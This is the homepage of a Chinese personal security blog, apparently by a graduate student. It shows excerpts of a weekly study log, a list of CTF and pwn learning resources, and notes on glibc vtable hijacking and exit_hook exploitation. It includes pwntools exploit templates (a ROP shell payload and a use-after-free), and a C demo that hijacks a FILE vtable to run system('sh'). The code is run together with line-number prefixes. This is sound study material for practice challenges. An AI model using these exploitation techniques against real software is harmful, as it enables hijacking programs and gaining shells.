<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>唐仔橙</title><meta name="author" content="唐仔橙,tangzicheng233@gmail.com"><meta name="copyright" content="唐仔橙"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:type" content="website">
<meta property="og:title" content="唐仔橙">
<meta property="og:url" content="https://tangzichengcc.github.io/index.html">
<meta property="og:site_name" content="唐仔橙">
<meta property="og:description" content="喜欢探索世界,在读研究生,计算机爱好者的成长记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://tangzichengcc.github.io/img/profile.png">
<meta property="article:author" content="唐仔橙">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://tangzichengcc.github.io/img/profile.png"><link rel="shortcut icon" href="/img/favicon.webp"><link rel="canonical" href="https://tangzichengcc.github.io/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="MTZmw-Jp9gUmwt4q-TLzEzI1_TFDA2QpQLuyUeOqzk4"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":500,"languages":{"author":"作者: 唐仔橙","link":"链接: ","source":"来源: 唐仔橙","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '唐仔橙',
  isPost: false,
  isHome: true,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2024-02-18 23:57:21'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/index_img.gif')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">唐仔橙</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">唐仔橙</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF%E2%80%94%E5%AD%A6%E4%B9%A0%E5%91%A8%E6%8A%A5/" title="成长之路—学习周报">成长之路—学习周报</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-28T00:46:24.000Z" title="发表于 2023-03-28 08:46:24">2023-03-28</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-12T15:43:05.316Z" title="更新于 2023-11-12 23:43:05">2023-11-12</time></span></div><div class="content">2023年第一周(3.27-4.2)1.高级网络攻防练习题1(栈迁移、orw、ret2csu),简单学了下第二题堆的两个漏洞原理(largebinattack &amp; poison null byte)
2.精读论文并准备pre的ppt
https://www.usenix.org/conference/usenixsecurity22/presentation/myung
3.补天10周年活动,志愿者、 制作学术道德视频
第二周(4.3-4.9)1.高级攻防writeup,主要练习规范和画图
2.虚拟化pre+分析博客
3.阅读分析malloc源码,分析largebin漏洞
4.栈迁移三道练习题目
5.读论文: MOZE(自动化堆风水)和一篇综述(内存安全)
Maze: Towards Automated Heap Feng Shui
SoK: Eternal War in Memory
6.做了一点但不多: 阅读afl源码、软件漏洞分析与挖掘作业,逆向题以及整合ppt、pwn一键搭建环境脚本
第三周(4.10-4.16)不要惧怕畏惧自己不擅长的,以及觉得自己不喜欢学的,比如AI,早晚可能会用到,所以该学还得学!!
1.精读论文,制作ppt和讲稿pre:自动化堆风水
https://www.usenix.org/conference/usenixsecurity22/presentation/myung
2.三道栈迁移博客 + 5道题练习
3.uaf学习和题目练习
4.计算机系统基础(一)：程序的表示、转换与链接 看了四章节左右
第四周(4.17-4.23)1.红明谷杯+中国海洋大学ctf、月赛pwn出题
2.计算机基础看了两章节左右、csapp做了半章习题
3.移动安全作业,大概读了一下demo的代码
https://github.com/song-dev/device-info
第五周(4.24-4.30)这一周上到一半就开始准备五一出去玩了…导致干的活不是很多…
1.南大cs基础继续看,快看完了,csapp第三章做到一半多了
2.复习和学习了一下域渗透、Linux后门
3.移动安全作业,就简单的读懂了实现逻辑,添加了一个读取通讯录的功能
第六周(5.1-5.7)1.cpp学习了两章
2.学习了一点域渗透
3.做了一个csapp实验(二进制炸弹)
第七周(5.8-5.14)1.totolink T10 路由器 环境搭建 业务分析 漏洞复现
第八周(5.15-5.21)1.周六月赛,做了一天
寄……摆了一星期
第九周(5.22-5.28)1.过了音乐考试、游泳考试、软件漏洞分析与发现考试!
2.做了一点组里的活
第十周(5.29-6.4)1.高级网络攻防考试,以及学了一下offbyone,
2.dasctf 二进制专项比赛
第十一周(6.5-6.11)1.升级赛…条件竞争…得好好看看pwncollege了..要学的还很多
2.这周忘了干啥…感觉时间比较零碎…(还是尽量不要把时间打的太散比较好,可以安排一块时间处理散乱的事情)
第十二周 (6.12 - 6.18)1.夏季学期云安全存储实践系统的前端(QT、C++实现)
2.乙队月赛,终于拿到第一名了!拿到奖金了!!,虽然成长缓慢,但是从最初的菜鸡,一道题也做不出来,也看不懂,到现在基本都有思路,简单一点的话能AK,还是有点长进的,算是一点小小的欣慰吧,继续加油!!!
第十三 - 十六周(6.19 - 7.16)休息. 旅游
第十七周 7.17-7.231.虚拟化入门,了解了下虚拟化
2.忘了..好像在摸鱼
第十八周 7.24 - 7.301.虚拟化 了解CPU相关, 看了一下KVM源码
2.pwn学了两种手法
3.回工位装系统装环境….遇到了很奇怪的问题..拆机+反复装系统,感觉挺好玩的….
第十九周 7.31 - 8.6在家躺着
第二十-二十二周8.7-27hw
第二十三周 8.28-9.3看内存虚拟化、云原生安全
第二十四周 9.4-9.10月赛出题3道
第二十五周 9.11 - 9.17对象生病,陪护住院
第二十六周 9.18 - 9.24调研
各种小事
brics ctf
第二十七周 9.25 - 10.1回炉重造c,打基础
打升级赛: 意识到自己还有差距,不过目标更清晰了
第二十八周 10.2 - 10.8玩
第二十九周 10.9 - 10.15调研弹性计算相关内容
第三十周10.16 - 10.22学习rust,完成入门100题
第三十一周 10.23-10.29我忘了…
第三十二周 10.30 - 11.5月赛、组里活、c基础回顾
记录的越来越潦草了…得警醒一下, 同时感觉自己每周做的事情太杂了,太分散了,或许需要调整一下策略
第三十三周 11.6-11.121.glibc调试、月赛题目复盘分析、c书最后小实验
2.做了几道练习题,学了几种新的手法
3.看了点namespace隔离
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-0-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E5%8F%8A%E5%A4%87%E5%BF%98%E4%BB%93%E5%BA%93/" title="pwn入门-0-学习资源及备忘仓库">pwn入门-0-学习资源及备忘仓库</a><div class="article-meta-wrap"><span class="article-meta"><i class="fas fa-thumbtack sticky"></i><span class="sticky">置顶</span><span class="article-meta-separator">|</span></span><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-18T11:36:51.000Z" title="发表于 2023-02-18 19:36:51">2023-02-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-11T10:26:24.082Z" title="更新于 2024-02-11 18:26:24">2024-02-11</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/PWN/">PWN</a></span></div><div class="content">[toc]
每日可看玄武实验室  sec.today
安全研究 GoSSIP 公众号每日推送
吾爱破解 https://www.52pojie.cn
看雪论坛 https://bbs.kanxue.com
v2ex 分享探索 社区 https://www.v2ex.com
资源整合和学习路径https://csdiy.wiki/ 北大学生总结的自学指南,非常好,融合了许多优质的公开课程和书籍
最近待看https://github.com/firmianay/CTF-All-In-One/tree/master 感觉作者有添加一些新的东西(相比那本书)
https://seedsecuritylabs.org/instructor_manual.html seedlab
https://nju-projectn.github.io/ics-pa-gitbook/ics2021/ 南大计算机基础实验
http://www.hackdig.com
https://www.bookstack.cn/read/webxiaohua-gitbook/README.md
https://hacklido.com/ 一个国外的网站, 有篇很励志的文章https://hacklido.com/blog/439-how-i-got-my-oscp-at-16-years-old
https://hsqstephenzhang.github.io/2022/02/10/linux/syscall/vdso/  腾讯云容器团队的一个老哥的博客,感觉挺有意思
北理工那个团队网站 https://www.isclab.org.cn
https://www.ooopn.com 一个工具网站
https://bbs.kanxue.com/thread-218617.htm 看雪 个人博客
https://hnusec.github.io/#/Stuff
国际知名战队的博客等
https://defcon.org/html/defcon-29/dc-29-speakers.html#fournier
https://blog.csdn.net/Breeze_CAT/article/details/103788631
https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html
https://www.52pojie.cn/thread-1399142-1-1.html
https://hack1s.fun/page/2/
http://javabin.cn 一个搞物联网的,感觉挺有意思
问题libc.so.6怎么用?
https://www.cnblogs.com/Taolaw/p/16281185.html
Glibc,libc gcc工作原理了解清楚
学习资源安全会议四大顶会
blackhat https://www.blackhat.com
https://www.blackhat.com/latestintel/
https://www.blackhat.com/html/archives.html
安全社区(可以没事多逛逛)玄武实验室  sec.today
吾爱破解 https://www.52pojie.cn
看雪论坛 https://bbs.kanxue.com
v2ex 分享探索 社区 https://www.v2ex.com
https://www.ctfiot.com  chamd5的! 一个综合信息平台
学习网站CTFwiki（入门必看wiki）: https://ctf-wiki.github.io/ctf-wiki/#/introduction
ctftime     ctf各个比赛日程,很权威
buuctf   https://buuoj.cn/
ctfshow https://ctf.show/challenges
ctfhub
CTFrank: https://ctfrank.org/
攻防世界  xctf官方: https://time.xctf.org.cn
i春秋   https://www.ichunqiu.com/competition
http://www.wechall.net/active_sites  一个ctf网站，同时也收录了很多学习网站
Tryhackme\hackthebox\
蓝桥云课
pwn专属pwn.college   由浅入深,一步一步,还有机器可以用!
https://pwnable.kr            
http://pwnable.tw            
重要比赛defcon https://defcon.org/html/defcon-30/dc-30-training.html
书籍《计算机安全导论：深度实践 (杜文亮) 》 很适合入门,讲的非常详细
《从0到1，CTFer的成长之路》
《CTF权威指南-PWN篇》
大佬博客https://xuanxuanblingbling.github.io       xuanxuan和他对象的,记录了从小白到大神的一路,感觉写得非常好!
https://blingblingxuanxuan.github.io
https://hurricane618.me IIE学长的博客,有写自己的心路历程,感觉很不错,能从中看到一个人的成长 
https://kiprey.github.io       清华网安硕士在读,博客深入浅出,良好的学习路线
https://blog.csdn.net/weixin_45209963?type=blog 天大pwn老哥的博客
计算机底层的秘密 https://github.com/webxiaohua/gitbook/blob/master/SUMMARY.md 这个合集不错
http://ifsec.blogspot.com/2018/02/so-you-want-to-work-in-security-and-for.html
https://bestwing.me/archives/page/14/
https://etenal.me/archives/1121 待看,这个也不错,这一篇是堆的
http://blog.imv1.me  NeSE搞内核安全的大佬学长
https://eqqie.cn
https://github.com/kiprey/skr_Learning 一个非常不错的成长路线(每周更新),可以参考,
https://cjting.me  做的一些很深入的小研究,治愈系
https://trailofbits.github.io/ctf/
https://security.ntu.st/
https://github.com/BrieflyX/ctf-pwns 
Atum
https://hpdoger.cn/about/ 又一个学长的博客
https://trailofbits.github.io/ctf/
https://security.ntu.st/
https://etenal.me/archives/972#C1
https://github.com/BrieflyX/ctf-pwns
https://y4er.com web

https://blog.flanker017.me
Eastmount（csdn）、娜璋ai安全之家（公众号）：博士在读，研究AI、网络安全   https://blog.csdn.net/Eastmount
http://shell-storm.org 国外大佬，还有很多shellcode样本[http://shell-storm.org/shellcode/](

http://scz.617.cn:8   不知道是哪个大佬.. 
http://showlinkroom.me
https://eternalsakura13.com/
https://kiprey.github.io/
http://blog.eonew.cn/
http://ruanyifeng.com/blog/2018/02/docker-tutorial.html
https://thiscute.world/ 最近发现的两个计算机的大佬,在v2ex中发现的
https://soulteary.com 
0xffff社区
https://0xffff.one/d/1085-mit6-s081-operating-system
CTF知名战队网站国科大-NeSE:https://nese.team
清华:https://redbud.info
复旦白泽战队:知乎、微信公众号
X1cT34m: https://ctf.njupt.edu.cn   
SU:https://team-su.github.io
星盟:https://space.bilibili.com/489643272 有ctf培训课程 pwn已完结 、 微信公众号:星盟安全
天璇Merak: 微信公众号,有一些文章,更新较少
星盟  http://blog.xmcve.com
漏洞挖掘&#x2F;分析工具angr
一些小工具:Compiler Explorer   在线应用层代码转汇编
在线运行汇编 https://www.tutorialspoint.com/compile_assembly_online.php
https://www.textcompare.org diff网站,比较各种内容的不同
https://gchq.github.io/CyberChef/ 解密解码工具
https://cloudconvert.com 在线格式转换
https://web.archive.org 查看历史网站记录 
https://cloudconvert.com  各种文件的格式转换
https://www.ilovepdf.com  pdf操作，切割等
ctf导航http://www.ctfiot.com. ChaMd5团队做的
https://ctf.mzy0.com
特定漏洞相关资源堆how2heap(github)
https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2
待整理资源https://blog.csdn.net/Breeze_CAT/article/details/103788631
其他查看系统调用
https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl
系统调用参考\查看系统调用参数
https://syscalls64.paolostivanin.com
https://elixir.bootlin.com/linux/v5.19/C/ident/getname
macbook 快捷键
http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac下Iterm2使用及快捷键.html
解题模版
123456789101112131415161718from pwn import *context.log_level= &quot;debug&quot;context.arch=&#x27;amd64&#x27; //sh = process(&quot;./ret2syscall&quot;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]gdb.attach(sh,&quot;break *0x8048e96&quot;)binsh = 0x080BE408edxecxebx = 0x0806eb90eaxret = 0x080bb196int80 = 0x08049421payload = b&quot;a&quot;*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408)+p32(int80)  sh.send(payload)sh.interactive()





1234567891011121314151617181920212223242526from pwn import *context.log_level= &quot;debug&quot;context.arch=&#x27;amd64&#x27;io = process(&quot;./hacknote&quot;)def add(length,context):    io.sendlineafter(&quot;choice&quot;,&quot;1&quot;)    io.sendlineafter(&quot;size&quot;,str(length))    io.sendlineafter(&quot;Content&quot;,context)def delete(index):    io.sendlineafter(&quot;choice&quot;,&quot;2&quot;)    io.sendlineafter(&quot;Index&quot;,str(index))def Print(index):    io.sendlineafter(&quot;choice&quot;,&quot;3&quot;)    io.sendlineafter(&quot;Index&quot;,str(index))add(16,&quot;aaa&quot;)add(16,&quot;bbb&quot;)delete(0)delete(1)add(8,p32(0x08048986))Print(0)io.interactive()#io.recv(1024)



libc版本问题,需要换一下
2.27
[DEBUG] Received 0x29 bytes:    b’free(): double free detected in tcache 2\n’
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持">pwn入门-55-iofile入门之vtable劫持</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-11T08:43:00.000Z" title="发表于 2024-02-11 16:43:00">2024-02-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-11T08:49:30.637Z" title="更新于 2024-02-11 16:49:30">2024-02-11</time></span></div><div class="content">伪造vtable​	理解了上面的原因就会晓得，攻击的原理就是伪造vtable的函数指针，当io操作调用里面的函数的时候，就会调用到我们自己伪造的函数
​	伪造分两种
​	1. 伪造部分指针，vtable不变，只是改写里面的特定指针，通过任意地址写可以实现
​	2. 伪造全部vtable，将vtable的指针覆盖指向我们控制的内存，在可控内存中布置函数指针
基础​	vtable的地址： 64下对于_IO_FILE_plus 的偏移是0xd8
12pwndbg&gt; p sizeof(struct _IO_FILE)$2 = 216    (0xd8)



​	printf会调用vtable中的xsputn，对应第8项
123456789pwndbg&gt; tele 0x7ffff7dd06e000:0000│  0x7ffff7dd06e0 (_IO_file_jumps) ◂— 0x001:0008│  0x7ffff7dd06e8 (_IO_file_jumps+8) ◂— 0x002:0010│  0x7ffff7dd06f0 (_IO_file_jumps+16) —▸ 0x7ffff7a869d0 (_IO_file_finish) ◂— push rbx03:0018│  0x7ffff7dd06f8 (_IO_file_jumps+24) —▸ 0x7ffff7a87740 (_IO_file_overflow) ◂— mov ecx, dword ptr [rdi]04:0020│  0x7ffff7dd0700 (_IO_file_jumps+32) —▸ 0x7ffff7a874b0 (_IO_file_underflow) ◂— mov eax, dword ptr [rdi]05:0028│  0x7ffff7dd0708 (_IO_file_jumps+40) —▸ 0x7ffff7a88610 (_IO_default_uflow) ◂— mov rax, qword ptr [rdi + 0xd8]06:0030│  0x7ffff7dd0710 (_IO_file_jumps+48) —▸ 0x7ffff7a89990 (_IO_default_pbackfail) ◂— push r1507:0038│  0x7ffff7dd0718 (_IO_file_jumps+56) —▸ 0x7ffff7a861f0 (_IO_file_xsputn) ◂— xor eax, eax





案例​	wiki上的例子就是第一种伪造,vtable不变,只是修改特定指针,但是目前流行的libc版本都不行了,例如libc2.23(已经过时了..) vtable所在地址就已经不可写
​	下面看第二种例子,伪造全部vtable
123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(void)&#123;    FILE *fp;    long long *vtable_addr,*fake_vtable;    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);    fake_vtable=malloc(0x40);    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset    vtable_addr[0]=(long long)fake_vtable;    memcpy(fp,&quot;sh&quot;,3);    fake_vtable[7]=&amp;system; //xsputn    fwrite(&quot;hi&quot;,2,1,fp);&#125;



​	因为 vtable 中的函数调用时会把对应的 _IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入 _IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。
123456789► 0x7ffff7a7b7c8 &lt;fwrite+182&gt;    call   qword ptr [rax + 0x38]        &lt;_IO_file_xsputn&gt;        rdi: 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2a84        rsi: 0x7fffffffe1a0 ◂— &#x27;modified content: thisisatest\n&#x27;        rdx: 0x1e        rcx: 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2a84 ► 0x7ffff7a7eab6 &lt;fwrite+182&gt;    call   qword ptr [rax + 0x38] &lt;system@plt&gt; *RDI  0x602010 ◂— 0xfb006873 /* &#x27;sh&#x27; */    





the_end1337到底是啥。。为啥经常出现。。
这个续表是什么呢？
咋只用给的libc。so呢，和ld
上面那三个应该是对象实例的指针
从map开始，是啥呢，反正是bss段了，可写
12345678910111213141516171819202122232425262728293031pwndbg&gt; tele 0x7ffff7a0d000+0x3c56f800:0000│  0x7ffff7dd26f8 (_IO_2_1_stdout_+216) —▸ 0x7ffff7dd06e0 (_IO_file_jumps) ◂— 0x001:0008│  0x7ffff7dd2700 (stderr) —▸ 0x7ffff7dd2540 (_IO_2_1_stderr_) ◂— 0xfbad208602:0010│  0x7ffff7dd2708 (stdout+2726106872) —▸ 0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2a8403:0018│  0x7ffff7dd2710 (stdin) —▸ 0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad208804:0020│  0x7ffff7dd2718 (DW.ref.__gcc_personality_v0) —▸ 0x7ffff7a2db80 (__gcc_personality_v0) ◂— sub rsp, 0x2805:0028│  0x7ffff7dd2720 (map) ◂— 0x0... ↓     2 skippedpwndbg&gt;08:0040│  0x7ffff7dd2738 (__printf_va_arg_table) ◂— 0x0... ↓     7 skippedpwndbg&gt;10:0080│  0x7ffff7dd2778 (buffer) ◂— 0x0... ↓     7 skippedpwndbg&gt;18:00c0│  0x7ffff7dd27b8 (buffer) ◂— 0x0... ↓     7 skippedpwndbg&gt;20:0100│  0x7ffff7dd27f8 (buffer) ◂— 0x0... ↓     7 skippedpwndbg&gt;28:0140│  0x7ffff7dd2838 (buffer) ◂— 0x0... ↓     7 skippedpwndbg&gt;30:0180│  0x7ffff7dd2878 (domain) ◂— 0x0... ↓     7 skippedpwndbg&gt;38:01c0│  0x7ffff7dd28b8 (__stop___libc_freeres_ptrs) ◂— 0x0... ↓     7 skippedpwndbg&gt;40:0200│  0x7ffff7dd28f8 (release_handle) ◂— 0x0



在虚表附近找可读可写的地方，伪造vtable，相差别太大，两字节正合适，可以修改到这里
也可以打其他的指针 dlfini
https://xz.aliyun.com/t/3255#toc-13  这个exp是可以的呀！
</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用">pwn入门-54-exit_hook函数利用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-11T08:01:29.000Z" title="发表于 2024-02-11 16:01:29">2024-02-11</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-02-11T08:23:31.611Z" title="更新于 2024-02-11 16:23:31">2024-02-11</time></span></div><div class="content">参考: https://www.cnblogs.com/bhxdn/p/14222558.html
exit的函数流demo
1234567#include&lt;stdio.h&gt;#include &lt;stdlib.h&gt;void main() &#123;     printf(&quot;bhxdn\n&quot;);     exit(0); &#125;



​	不同libc版本不知道差别大不大,回头可以总结下, 2.35也是有这两个函数的
​	-&gt; __run_exit_handlers
​		-&gt; _dl_fini
​	_dl_fini中调用了 _ _rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive , 所以修改它们为onegadgte就可以getshell
1234567891011121314151617181920212223voidinternal_function_dl_fini (void)&#123;    ..#ifdef SHARED  int do_audit = 0; again:#endif  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)    &#123;      /* Protect against concurrent loads and unloads.  */      __rtld_lock_lock_recursive (GL(dl_load_lock));      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;      /* No need to do anything for empty namespaces or those used for	 auditing DSOs.  */      if (nloaded == 0#ifdef SHARED	  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit#endif	  )	__rtld_lock_unlock_recursive (GL(dl_load_lock));

寻找要修改的函数指针​	那如何修改呢? 需要找到这两个函数的位置,修改指针

​	可以看到这里的符号信息是rtld_lock_default_lock_recursive,而不是__rtld_lock_lock_recursive,为什么呢?
​	答: 可能是利用了一些函数指针替换、宏替换等等,先不细究
12345#if defined SHARED &amp;&amp; defined _LIBC_REENTRANT \    &amp;&amp; defined __rtld_lock_default_lock_recursive  GL(dl_rtld_lock_recursive) = rtld_lock_default_lock_recursive;  GL(dl_rtld_unlock_recursive) = rtld_lock_default_unlock_recursive;#endif



​	可以根据打印的地址反推出来是在_rtld_global结构体中
12345678pwndbg&gt; tele 0x7ffff7de795e+0x2165e400:0000│   0x7ffff7ffdf42 (_rtld_global+3842) ◂— 0x7d2000000000000001:0008│   0x7ffff7ffdf4a (_rtld_global+3850) ◂— 0x7d3000007ffff7dd02:0010│   0x7ffff7ffdf52 (_rtld_global+3858) ◂— 0xaed000007ffff7dd03:0018│   0x7ffff7ffdf5a (_rtld_global+3866) ◂— 0x600007ffff7de04:0020│   0x7ffff7ffdf62 (_rtld_global+3874) ◂— 0x100000000000005:0028│   0x7ffff7ffdf6a (_rtld_global+3882) ◂— 0x300000000000000006:0030│   0x7ffff7ffdf72 (_rtld_global+3890) ◂— 0x100007ffff7ff

​	该结构体的定义如下:
